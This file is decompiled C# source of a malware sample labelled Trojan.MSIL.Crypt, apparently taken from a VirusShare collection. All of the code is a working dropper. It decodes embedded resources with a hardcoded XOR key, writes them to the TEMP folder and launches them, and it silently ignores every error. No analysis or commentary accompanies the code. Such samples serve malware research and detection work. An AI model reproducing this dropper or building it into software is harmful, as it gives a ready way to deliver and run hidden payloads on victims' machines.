// Decompiled with JetBrains decompiler
// Type: Namespace.Class
// Assembly: SRzmUu2D, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6553E2D3-714D-4D88-ADD2-37716AA261F3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.MSIL.Crypt.ewz-7a475f10ede59058860f5a57968c7f5c88b02eb2c26f6d815c38f41d728afac2.exe

using System;
using System.Collections;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Resources;

namespace Namespace
{
  internal class Class
  {
    private static byte[] xor(byte[] data, string encryptionKey, int times)
    {
      for (int index = 0; index < data.Length; ++index)
        data[index] ^= (byte) ((int) encryptionKey[index % encryptionKey.Length] >> index + times + encryptionKey.Length & (int) byte.MaxValue);
      return data;
    }

    public static void Main()
    {
      try
      {
        foreach (DictionaryEntry resource in new ResourceManager("NLNC7DCWBhN7KskJo1", Assembly.GetExecutingAssembly()).GetResourceSet(CultureInfo.CurrentCulture, true, true))
        {
          string path = Environment.GetEnvironmentVariable("TEMP") + "\\" + resource.Key;
          try
          {
            if (File.Exists(path))
              File.Delete(path);
          }
          catch
          {
          }
          try
          {
            File.WriteAllBytes(path, Class.xor((byte[]) resource.Value, "75Q1xTZznGKffhN1SX0lC1o", 8));
          }
          catch
          {
          }
          try
          {
            new Process() { StartInfo = { FileName = path } }.Start();
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
    }
  }
}
